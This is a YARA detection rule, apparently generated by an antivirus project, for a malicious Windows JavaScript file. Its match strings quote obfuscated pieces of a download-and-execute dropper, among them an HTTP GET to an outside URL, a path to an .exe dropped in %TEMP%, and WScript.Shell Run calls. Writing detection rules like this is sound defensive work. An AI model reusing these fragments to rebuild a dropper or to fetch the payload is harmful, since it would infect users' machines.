rule sig_20160328_d1820388f11d6bb00fb2e59a50890e9b {
  meta:
    description = "datamaliciousorder - file 20160328_d1820388f11d6bb00fb2e59a50890e9b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "574be82537a866d87f691964e6c3035a26b51243a04b0c8d033b0c8ce0dabde1"

  strings:
    $s1  = "function Fsuywzzwaq() {return Wiojvx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"uMBcnOOe4QtCCn2.exe\";};" fullword ascii
    $s2  = "do {WScript[Wppsemx](Gijnx() * 11)} while (Ujsqch[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Ujsqch[Xuqpiuhz](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s4  = "function Pcdjju(Jnwzry, Mzfxy){return Jnwzry - Mzfxy;};" fullword ascii
    $s5  = "var Wiojvx = function Dbeajvsbhw() {return WScript[Uopltymucr](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ndstpaogev() {return ((Dqikuquhkt == true) && (Dqikuquhkt == Pqfdzdexw)) ? 1 : Smcnw;};" fullword ascii
    $s7  = "function Pdthcgj(Qopccjg){Wiojvx[\"Run\"](Qopccjg, Smcnw, Smcnw);};" fullword ascii
    $s8  = "var Dqikuquhkt = false;" fullword ascii
    $s9  = "Dqikuquhkt = true; " fullword ascii
    $s10 = " while (Udhhxphl){" fullword ascii
    $s11 = "Pqfdzdexw = true; " fullword ascii
    $s12 = "function Wclhvx(){return Zmqtcu;};" fullword ascii
    $s13 = "function Tpzbj(){return Uopltymucr;};" fullword ascii
    $s14 = "return Pcdjju(Yeuhwddz, Zvaumt);" fullword ascii
    $s15 = "var Pqfdzdexw = false;" fullword ascii
    $s16 = "var Fblxvp = new this[\"Date\"]();" fullword ascii
    $s17 = "function Nemaoljre()" fullword ascii
    $s18 = "function Deniowrehj(Lyzuontc) {var Vbyxvhtf = (1, 2, 3, 4, 5, Lyzuontc); return Vbyxvhtf;};" fullword ascii
    $s19 = "function Gijnx(){return 22;};" fullword ascii
    $s20 = "var Wglrjrrgu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}